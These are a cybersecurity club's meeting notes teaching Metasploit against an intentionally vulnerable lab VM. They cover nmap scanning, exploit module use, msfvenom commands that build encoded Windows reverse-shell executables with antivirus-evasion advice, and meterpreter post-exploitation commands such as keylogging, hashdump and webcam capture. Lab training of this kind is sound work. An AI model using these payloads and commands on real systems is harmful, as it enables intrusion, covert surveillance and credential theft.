---
title: "Meeting_2"
author: "Andrew Bernal"
type: ""
date: 2023-09-20T18:35:25-04:00
subtitle: ""
image: ""
tags: []
---
# Meeting 2: Metasploit
Goals:
We have 4-5 vulnerable machines set up

## Table of Contents
- [Setting up Vulnerable VM](#Setting-up-Vulnerable-VM]
- [Connecting to a database](#connecting-to-a-database)
- [Scanning](#scanning)
- [Exploitation](#exploitation)
    - [Choosing an exploit](#choosing-an-exploit)
    - [Searching](#searching)
    - [Online Vuln Database scanning](#Online-Vuln-Database-scanning)
    - [Using a payload](#using-a-payload)
    - [Types of payloads](#types-of-payloads)
- [Post-Exploitation](#post-exploitation)
    - [What is Meterpreter?](#what-is-meterpreter)
- [Further Reading](#further-reading)

## Metasploit
Metasploit is a widely used penetration testing framework that helps find, exploit, and validate vulnerabilities in systems. To open Metasploit, type `msfconsole` in the terminal.

### Setting up Vulnerable VM
We've installed metasploit**able** on every computer in the lab
This is an intentionally insecure machine, for testing.

Navigate to Oracale VM VirtualBox Manager on the lab computers.
Run CyberSec-Club-Metasploitable.

Login:
User: msfadmin
pass: msfadmin

### Connecting to a database
Metasploit can connect to a PostgreSQL database. To set up and initialize the database, run `msfdb init` in bash. After launching Metasploit with `msfconsole`, you can verify the database connection with the `db_status` command.
 - These commands are run on the Attacking computer(host), which is separate & not inside the metasploitable vm.

See [Metasploit Database](#metasploit-database) for more details.

Once connected to the database, you can view the vulnerabilities from your scan with `vulns`
### Scanning
The goal of scanning is to learn more about the machine, so you can plan your attack.

`db_nmap` will do an nmap scan and save the results in your metasploit database.

These are some useful nmap commands

1. **-sP or -sn (Ping Scan)**
   - Used to discover live hosts without performing a port scan.
   - `nmap -sn 192.168.1.0/24`

2. **-sT (TCP Connect Scan)**
   - The most basic form of TCP scanning involving the full TCP handshake.
   - `nmap -sT 192.168.1.10`

3. **-sS (SYN Scan or Half-Open Scan)**
   - Stealthier than a full connect scan because it doesn't complete the TCP handshake.
   - `nmap -sS 192.168.1.10`

4. **-sU (UDP Scan)**
   - Used to discover open UDP ports.
   - `nmap -sU 192.168.1.10`

5. **-sV (Version Detection)**
   - Probes open ports to determine service/version info.
   - `nmap -sV 192.168.1.10`

6. **-O (OS Detection)**
   - Tries to determine the operating system of the target.
   - `nmap -O 192.168.1.10`

7. **-F (Fast Mode)**
   - Scans fewer ports compared to a full scan. Targets the most common 100 ports.
   - `nmap -F 192.168.1.10`

8. **-p (Specify Port Range)**
   - Define a specific range or list of ports to scan.
   - `nmap -p 20-30,80,443 192.168.1.10`

9. **-Pn (No Ping)**
   - Skips the host discovery phase and assumes the host is online.
   - `nmap -Pn 192.168.1.10`

10. **-T[0-5] (Timing Templates)**
   - Adjusts scan speed. Ranges from T0 (paranoid, slowest) to T5 (insane, fastest).
   - `nmap -T4 192.168.1.10`

11. **-A (Aggressive Scan)**
   - Enables OS detection, version detection, script scanning, and traceroute in one command.
   - `nmap -A 192.168.1.10`

12. **-v and -vv (Verbosity Levels)**
   - Increases the verbosity of the scan output.
   - `nmap -vv 192.168.1.10`

13. **--script (Script Scan)**
   - Utilizes the Nmap Scripting Engine (NSE) to run specific scripts against targets.
   - `nmap --script http-title 192.168.1.10`

14. **--exclude and --excludemask**
   - Used to exclude hosts or networks from scanning.
   - `nmap 192.168.1.0/24 --exclude 192.168.1.5`

15. **-iL (Input from List)**
   - Scan hosts listed in a file.
   - `nmap -iL hosts.txt`

### Exploitation
The goal of exploitation is to use a vulnerability to access the machine. 

#### Choosing an exploit
Note: There are multiple ways to search for exploits & vulnerabilites, you can use the  [Online Vuln Database scanning](#Online-Vuln-Database-scanning) method or  - [Searching](#searching) method

##### Searching 
With the db_nmap or nmap scan may see a list of ports and their respective services.
Along with this you will see vulnerabilities when searaching withing metasploit

Type `vulns` to view the vulnerabilities your scan found.

Now use the `search` command to figure out which metasploit modules can exploit what you found. 

To search for exploits on windows, you could type `search -t exploit -p windows`

`-t` is type. It can distinguish between metasploit's different offerinsgs, such as: `exploit, payload, post, auxiliary, encoder, nop`


Some other useful parameters:
+ `--cve` filter by CVE identifier
+ `-o` order the results. Can do it by `rank`, `name`, 
+ `author` to search by a particular author, i.e. `rapid7`

For example, to search by cve, type `search --cve CVE-2021-12345`

you can use the  [Online Vuln Database scanning](#Online-Vuln-Database-scanning) method or  - [Searching](#searching) method

##### Online Vuln Database scanning
Once you have a list of services running on you target machine, pick a service to test its security.
With the name of the service, navigate to https://www.rapid7.com/db and type in the name of the service. Be sure to also select Module, to actually get the exploit.

There will be a **module path** file similar to "exploit/unix/ftp/vsftpd_234_backdoor". It will awlways start with exploit.


##### Using a Payload
After you have selected the a payload and have its module path.
1. We need to access the module of the exploit to configure its options, before we send our payload.
```sh
msfconsole > use exploit/<pathtomodule>
```
You are now within the module of your selected exploit

There will be some options similar to...
RHOST : "Needs to be the Target IP" "Will be the ip of our Metasploit**able** vm
RPORT : "Needs to the port of the vulnerable service on the target machine

2. Often RHOST will be blank and need to be set by you.
```sh
set RHOST < Target ip>
```

3. Run show options cmd & ensure the needed inputs are filled out.
```sh
show options
```
- Note: you should still be inside the module of the exploit.

3. NOW run the exploit command, once the module details are filled out.
```sh
 exploit
```
If no errors appear you have sent a payload/exploit to the target computer


#### Types of payloads
The exploit will get you onto the system. But what do you do once you get in? Here are some popular payloads

#### Common Metasploit Payloads

- **Windows TCP Reverse Shell (`windows/meterpreter/reverse_tcp`)**
   - A reverse shell payload that initiates a connection from a Windows target back to the attacker. The attacker gains access to a Meterpreter session on the compromised system. It's beneficial for bypassing outbound firewall restrictions.

- **Linux TCP Reverse Shell (`linux/x86/meterpreter/reverse_tcp`)**
   - Similar to its Windows counterpart, this payload initiates a connection from a Linux target back to the attacker. It provides a Meterpreter session, granting various capabilities like file interaction, system command execution, and more.

- **Windows TCP Bind Shell (`windows/meterpreter/bind_tcp`)**
   - The payload sets up a listening service on the target Windows machine. The attacker then connects to this service to establish a Meterpreter session. It's direct but may be blocked by firewall restrictions on the target.

- **Windows HTTPS Meterpreter (`windows/x64/meterpreter/reverse_https`)**
   - A Meterpreter session that uses HTTPS for encrypted communication. This method is harder to detect and differentiate from regular web traffic by intrusion detection systems.

- **Windows Shell Reverse TCP (`windows/shell/reverse_tcp`)**
   - Unlike the Meterpreter payload, this provides a simple command shell (similar to `cmd.exe` on Windows) on the compromised system. It's less stealthy and versatile than Meterpreter but is lightweight and direct.

- **Windows VNC Inject (`windows/vncinject/reverse_tcp`)**
   - Injects a VNC server into the memory of the target Windows machine.
   - Establishes a reverse connection, allowing the attacker to view and interact with the victim's desktop in real-time.
   - Provides visual access without installing persistent software, reducing detection by file-based antivirus solutions.
   - While powerful for demonstrations and real-time monitoring, it can be quite visible to the victim due to the sudden appearance of a VNC session.

##### Creating Custom Payloads with msfvenom
See (Msf Venom)[#msf-venom] for more details

- Generate an obfuscated reverse TCP shell for Windows:
  ```bash
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -f exe -e x86/shikata_ga_nai -i 3 > output.exe

### Post-Exploitation
Post-exploitation's goals are pretty open ended. You can try to maintain persistence, pivot around the network, etc.
This document has a lot of ideas: <http://www.pentest-standard.org/index.php/Post_Exploitation#File.2FPrinter_Shares>

#### What is Meterpreter
Meterpreter is like a shell, but it is harder to detect. as it runs entirely in memory and does not write to the disk. On Windows, this is accomplished via DLL injection on Windows, and on Linux it operates with ELF binaries and can employ methods such as injecting code into the memory spaces of existing processes.

+ `sysinfo`: This command retrieves and displays information about the remote system, such as its OS, architecture, and hostname.

+ `getuid`: It displays the user ID under which the Meterpreter server is running on the remote system.

+ `upload` and `download`: These commands allow you to upload files to the compromised system or download files from it.
    Example: upload /local/path/file.txt C:\\remote\\path\\file.txt

+ `shell`: This gives you a command shell on the remote system, allowing you to execute native commands.

+ `screenshot`: Captures a screenshot of the remote system's current desktop.

+ `keyscan_start` and `keyscan_dump`: These commands are used to start capturing keystrokes on the remote system (keyscan_start) and then retrieve the captured data (keyscan_dump).

+ `migrate`: Allows the Meterpreter session to migrate to another process. This is useful to ensure the session remains alive or to elevate privileges by migrating to a higher privilege process.

+ `ps`: Lists running processes on the remote system.

+ `kill`: Terminates a process on the remote system using its process ID.

+ `record_mic`: Records audio from the remote system's microphone.

+ `webcam_list` & `webcam_snap`: Lists available webcams and captures a photo from the specified webcam, respectively.

+ `hashdump`: Dumps the hashes from the compromised system, useful for offline password cracking.

## Further Reading
- [Msf Venom](#msf-venom)
  - [Encoders](#encoders)
- [Auxiliary Metasploit Tools](#auxiliary-metasploit-tools)
  - [Fuzzers](#fuzzers)
  - [Sniffers](#sniffers)
- [Metasploit Database](#metasploit-database)
- [Nmap Alternatives](#nmap-alternatives)
- [Metasploit Alternatives](#metasploit-alternatives)
- [Nmap Man Page](https://linux.die.net/man/1/nmap)

### Msf Venom
Use `-l` to list the payloads
```bash
msfvenom -l payloads
```

#### Encoders
```bash
msfvenom -l encoders
```

##### Example Command
```bash
msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -b "\x00" -e x86/shikata_ga_nai -i 5 -f exe > output.exe
```

###### Architecture
`-a x86`: Specifies the architecture of the payload. You can also try
+ `x64` For 64-bit systems.
+ `armle` For little-endian ARM systems.
+ `mipsbe` For big-endian MIPS systems.

###### Platform
`--platform Windows`: Specifies the platform of the payload. You can also try
+ `Linux`: For Linux systems.
+ `Android`: For Android devices.
+ `OSX`: For Apple’s macOS systems.

###### Payload
`-p windows/meterpreter/reverse_tcp`: Specifies the payload to generate.

###### LHOST
`LHOST=<Your IP>`: Sets the IP address for the payload to connect back to.

###### LPORT
`LPORT=<Your Port>`: Sets the port for your system to listen on.

###### Characters to avoid
`-b "\x00"`: Specifies a list of characters to avoid in the payload. Also can try: 

- `-b "\x00"`: Avoid characters in the payload.
- `\x00`: Null byte; terminates strings.
- `\x0A`: Line feed; can end commands in UNIX.
- `\x0D`: Carriage return; signals end of data in Windows.
- `\x20`: Space; can alter script or command behavior.

`-e x86/shikata_ga_nai`: Specifies the encoder to use on the payload.

###### Payload Format
See: `msfvenom --help-formats`

- `-f exe`: Windows executable format, ideal for direct execution on Windows systems.
- `-f elf`: ELF binary for Linux systems.
- `-f war`: Java Web Archive, targets Java-based server applications.
- `-f asp`: ASP script for older IIS servers.
- `-f php`: PHP script for web servers supporting PHP execution.
- `-f python`: Python script for systems with Python available.
- `-f js_be`: JavaScript for browser exploit scenarios.
- `-f raw`: Raw shellcode for direct injection or exploit development.
- `-f dll`: Windows Dynamic Link Library, suitable for DLL injection/hijacking.

- `-i 5`: Specifies the number of times to encode the payload. Multiple encodings help evade simple detections, but overdoing can bloat the payload. Typically, 2-5 iterations balance evasion and size. Five offers obfuscation without excessive bloating.

### Auxiliary Metasploit Tools

#### Fuzzers
Fuzzers are tools that provide randomized data to various inputs of a program. The goal is to discover new, unanticipated vulnerabilities by monitoring for unexpected behaviors like crashes or memory leaks.

- **HTTP Fuzzer**: A versatile tool that aids in identifying vulnerabilities in web applications by sending a barrage of randomized HTTP requests.
  
- **SMB Fuzzer**: Targets the Server Message Block (SMB) protocol to find potential overflows and other vulnerabilities within SMB services.
  
- **FTP Fuzzer**: Utilized for probing FTP (File Transfer Protocol) services for potential weaknesses by sending a sequence of randomized FTP commands.

- **DNP3 Fuzzer**: Focuses on the Distributed Network Protocol 3.0 (DNP3), commonly used in industrial control systems.

- **DNS Fuzzer**: Employs randomized domain queries and operations to unearth vulnerabilities in DNS servers.

#### Sniffers
Sniffers are tools that capture and analyze network traffic. They can be used to uncover unencrypted sensitive information, study network patterns, or even assist in advanced attacks like man-in-the-middle.

- **HTTP Traffic Sniffer**: Captures and analyzes unencrypted HTTP traffic to discern patterns, credentials, or other sensitive data.

- **VoIP Sniffer**: Especially effective in capturing Voice over IP (VoIP) traffic, potentially extracting call details and even audio data.

- **Password Sniffer**: Listens to traffic and attempts to pull plaintext passwords from various protocols, including HTTP, SMTP, and FTP.

- **LLMNR/NBNS Spoofer**: Monitors for LLMNR (Link-Local Multicast Name Resolution) and NBNS (NetBIOS Name Service) requests on the network, potentially hijacking them for Man-in-the-Middle attacks.

#### Scanners

- **Port Scanner**: Identifies open ports on a target system, helping to determine services and potential entry points.
  
- **Service Scanner**: Detects and identifies the specific versions of services running on open ports. Helpful in identifying potentially vulnerable services.

- **OS Detection**: Utilizes a variety of techniques to ascertain the operating system of a target device.

- **SSL Scanner**: Designed to identify SSL/TLS versions and vulnerabilities.

#### Recon

- **Subdomain Finder**: Discovers potential subdomains of a given domain, which can reveal hidden or less-known entry points.

- **Whois Lookup**: Gathers domain registration information, potentially providing intel on the target's administrators, registration dates, and more.

- **Network Discovery**: Maps out devices and services on a given network segment, providing a clear picture of the network topology.

#### Dos

- **TCP DoS**: Executes a Denial-of-Service attack by overwhelming the target with TCP requests.

- **UDP Flood**: Creates a massive amount of UDP traffic directed at a target, often causing service disruption.

- **HTTP Slowloris**: Engages a target by opening and maintaining many simultaneous HTTP connections, exhausting the target's resources.

### Metasploit database
Metasploit uses a PostgreSQL database by default. You can run it with `msfdb init`. You can confirm you are connected to the database by running `db_status` inside metrepreter.
More information can be found here: <https://docs.metasploit.com/docs/using-metasploit/intermediate/metasploit-database-support.html> 

Some common commands:

- **Workspace Management**:
  - `workspace`: Lists all workspaces.
  - `workspace [name]`: Switches to or creates a new workspace.
  
- **Host Management**:
  - `hosts`: Lists all hosts.
  - `hosts -d [ip]`: Deletes a specific host.
  
- **Service Management**:
  - `services`: Lists all services.
  
- **Vulnerability Management**:
  - `vulns`: Lists vulnerabilities.
  
- **Note Management**:
  - `notes`: Manages associated notes.
  
- **Credential Management**:
  - `creds`: Lists credentials (usernames/passwords).
  
- **Data Export**:
  - `db_export`: Exports data (XML, CSV, etc.).

- **Data Import**:
  - `db_import`: Imports data from various sources.

- **Database Connection**:
  - `db_connect`: Connects to a database.
  - `db_disconnect`: Disconnects from the current database.

- **Session Management**:
  - `background`: Puts the current session in the background.

### Nmap Alternatives
Nmap is useful for discovering devices on a network and finding open ports.

Tools like Nessus and Greenbone are used for vulnerability scanning.
Nessus vs Greenbone: <https://youtu.be/sEzN2U4Pqcs?si=f6bNdr_va-hGAz1D>

### Metasploit Alternatives
Metasploit is free. These are some more useful tools to look into. Some are paid.

1. [MITRE ATT&CK](https://attack.mitre.org/): A knowledge base curated by MITRE, detailing adversary tactics, techniques, and procedures. It provides insights into the various steps and methods adversaries might use during an attack.

2. [Cobalt Strike](https://www.cobaltstrike.com/): A commercial post-exploitation tool providing advanced red team operations and adversary simulations. It offers a range of covert techniques and tactics.

3. [PTES (Penetration Testing Execution Standard)](https://csrc.nist.gov/pubs/sp/800/115/final): A structured methodology detailing the stages of penetration testing, from initial communication and legalities to post-exploitation and reporting.

4. [OWASP](https://owasp.org/): The Open Web Application Security Project is a global non-profit focused on improving software security. It provides tools, standards, and documentation related to web application security, including the famous OWASP Top Ten list.

5. [NIST SP 800-115](https://csrc.nist.gov/pubs/sp/800/115/final): Published by the U.S. National Institute of Standards and Technology, this is a guide detailing the technical aspects of information security testing and assessments.

6. [Red Team Automation (RTA)](https://github.com/endgameinc/RTA): An open-source script collection that replicates various adversarial tactics and techniques. It's useful for validating detection and response capabilities.

7. [Atomic Red Team](https://atomicredteam.io/): An open-source testing framework that delivers small, focused tests based on MITRE's ATT&CK. It assists defenders in measuring their detection capabilities.

8. [CALDERA](https://caldera.mitre.org/): Developed by MITRE, CALDERA is a cyber adversary emulation system that automates the execution of post-compromise behaviors. It uses MITRE's ATT&CK knowledge base to plan and execute adversary operations.

9. [The Cyber Kill Chain](https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html); A model by Lockheed Martin to describe stages of cyberattacks. It aids defenders in understanding and defending against complex threats.

10. [BloodHound](https://github.com/BloodHoundAD/BloodHound): A tool that employs graph theory to display hidden relationships within Active Directory environments. It's instrumental in identifying potential attack paths an adversary might exploit.

11. [Metasploit Pro](https://blog.parrot-pentest.com/metasploit-pro-vs-free-whats-better/): While Metasploit offers a free version, the Pro variant is a paid offering with advanced features tailored for penetration testers and enterprises. It includes benefits such as automated vulnerability scans, web application scanning, and enhanced reporting capabilities.







